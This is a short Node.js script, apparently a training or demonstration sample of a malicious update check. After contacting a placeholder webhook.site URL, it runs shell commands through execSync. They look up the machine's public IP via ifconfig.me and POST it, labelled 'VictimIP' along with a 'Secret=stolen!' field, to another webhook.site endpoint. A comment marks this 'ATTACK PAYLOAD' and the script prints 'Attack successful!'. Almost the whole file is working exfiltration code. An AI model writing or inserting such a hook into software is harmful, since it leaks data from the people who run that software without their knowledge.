const https = require('https');
const { execSync } = require('child_process');

console.log('🔍 Checking for malicious updates...');

https.get('https://webhook.site/YOUR-URL/update?ver=1.0', (res) => {
  let data = ''; res.on('data', d => data += d);
  res.on('end', () => {
    console.log('📡 Update trigger received!');
    
    // ATTACK PAYLOAD
    const ip = execSync('curl -s ifconfig.me').toString().trim();
    execSync(`curl -X POST https://webhook.site/YOUR-TRAINER-URL -d "VictimIP=${ip}|Secret=stolen!"`);
    
    console.log('✅ Attack successful! Check webhook.site');
  });
});
